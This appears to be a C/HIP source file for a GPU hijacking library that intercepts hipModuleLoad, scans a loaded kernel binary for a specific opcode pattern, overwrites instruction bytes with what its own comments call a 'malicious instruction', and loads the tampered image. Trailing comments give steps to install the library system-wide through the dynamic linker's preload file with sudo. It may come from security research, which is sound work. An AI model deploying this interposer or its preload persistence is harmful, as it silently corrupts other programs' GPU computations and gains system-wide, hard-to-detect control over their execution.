#include <stdio.h>
#include <string.h>
#include <iostream>
#include <cstring>
#include <hip/hip_runtime.h>


char* injector(const char* fname);


hipError_t CUDAAPI hipModuleLoad(hipModule_t *module, const char *fname)
{
	//1.inject malicous instruction into cubin
	char* image = injector(fname);
	
	
	//2.load malicious cubin image into cuModule
	hipError_t code = hipModuleLoadData(module, image);
	if(code!=hipSuccess)
	{
		const char* err_message = nullptr;
		hipDrvGetErrorString(code, &err_message);
		printf("hijack error message = %s \n", err_message);
		return hipErrorInvalidValue;
	}
	
	
	printf("hijack success \n");
	return hipSuccess;
}




char* injector(const char* fname)
{
    char* image;  //the image of the cubin
    
    
    //1.open cubin
    FILE* fp;
    int f_size;
    fp = fopen(fname, "rb"); //open fname in read binanry mode
    if (fp == NULL) {
        printf("fatbin file open failed \n");
        return NULL;
    }
    
    
    //2.allocate memory space for fatbin image
    fseek(fp, 0, SEEK_END);
    f_size = ftell(fp); //size of cubin
    image = (char*)malloc(f_size * sizeof(char));
    memset(image, '\0', f_size * sizeof(char));
    fseek(fp, 0, SEEK_SET);
    
    
    //3.detect attack entry point, and inject malicious instruction
    const int ins_bytes = 8;
    char ins_buffer[ins_bytes] = { 0 };
    size_t n_read;
    f_size = 0;
    while ( n_read=fread(ins_buffer, sizeof(char), ins_bytes, fp) ) { //read source cubin into instruction buffer
        //for (int i = 0; i < ins_bytes; i++) {
            //printf("0x%02X ", (unsigned char)ins_buffer[i]);
        //}
        //printf("\n");
        if ( (ins_buffer[ins_bytes-1]==0x36) && ( ins_buffer[ins_bytes-2]==0x68) ) {  //instruction filter detects opcode
            ins_buffer[2] = 0xe7; //0x57
            ins_buffer[3] = 0x0f; //0x0e
            //ins_buffer[2] = 0x47; //0x57
            //ins_buffer[3] = 0x06; //0x0e
        }
        memcpy(image + f_size, ins_buffer, n_read);  //copy instruction buffer into cubin image
        f_size = f_size + n_read;
    }
    
    
    //3.free source
    fclose(fp);
    
    return image;
}


//	"LD_PRELOAD=./hijack/hijack.so  ./segment_gpu/image_segment" has losed efficacy

// 	 cd ~/Desktop/ImageProcess/hijack
// 	 sudo mv image_hijack.so /usr/lib
//	sudo vim /etc/ld.so/preload
// 	/usr/lib/image_hijack.so













